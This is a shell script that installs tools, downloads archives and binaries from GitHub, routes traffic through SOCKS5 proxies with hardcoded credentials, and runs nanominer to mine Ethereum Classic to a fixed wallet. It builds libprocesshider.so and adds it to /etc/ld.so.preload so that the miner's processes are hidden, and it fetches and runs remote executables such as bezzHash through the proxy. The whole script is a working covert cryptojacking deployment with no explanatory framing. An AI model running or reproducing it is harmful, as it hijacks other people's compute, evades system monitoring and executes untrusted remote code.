#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233 
loglevel = 1 
socks5 = 3.15.39.186:1080 
socks5_username = mikrotik999 
socks5_password = Elibawnos 
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo "**"

echo " "

echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

apt install proxychains
sed -i 's/socks4/socks5/' /etc/proxychains.conf
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf

array[0]="Kopi"
array[1]="Nyaman"
array[2]="DiLambung"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
wget -qO nano https://github.com/angkii/ngengBahan/raw/main/nanominer.zip
unzip -qq nano
chmod +x nanominer
echo "[Ethash]
wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
coin = ETC
rigName = $worker
rigPassword = x
pool1 = etc.2miners.com:1010" > config.ini
./nanominer
